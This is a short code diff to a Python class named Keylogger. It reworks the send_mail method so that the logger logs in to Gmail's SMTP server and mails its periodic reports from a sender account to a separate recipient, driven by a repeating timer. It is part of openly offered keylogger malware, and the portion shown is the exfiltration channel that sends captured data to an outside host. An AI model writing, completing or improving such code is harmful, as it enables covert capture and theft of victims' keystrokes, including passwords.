@@ -30,11 +30,11 @@ class Keylogger:
 		timer=threading.Timer(self.interval, self.report)
 		timer.start()
 	
-	def send_mail(self,email,password, message):
+	def send_mail(self,email_to,email_from,password, message):
 		server=smtplib.SMTP("smtp.gmail.com",587)
 		server.starttls()
-		server.login(email,password)
-		server.sendmail(email,email,message)
+		server.login(email_from,password)
+		server.sendmail(email_from,email_to,message)
 		server.quit()
 	
 	def start(self):
